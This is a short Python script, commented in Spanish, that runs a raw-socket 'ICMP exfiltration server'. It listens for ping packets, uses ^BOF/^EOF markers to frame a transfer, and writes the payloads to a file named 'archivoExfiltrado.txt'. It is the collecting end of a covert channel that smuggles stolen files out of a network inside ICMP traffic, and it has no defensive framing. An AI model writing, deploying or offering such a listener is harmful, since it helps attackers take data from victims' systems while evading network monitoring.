import socket

def listen():
 s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
 s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
 with open('archivoExfiltrado.txt','wb') as catch:
   print("Iniciado el servidor de exfiltración ICMP...")
   while True:
     data, addr = s.recvfrom(1508)
     print("Recibido paquete %r de %r" % (addr,data))
     if '^BOF' in data.decode():
       print("INICIO")
       continue
     if '^EOF' in data.decode():
       catch.write(data[-1472:-4])
       print("FINAL")
       break
     catch.write(data[-1472:])
     print("¡¡Archivo recibido!!")

listen()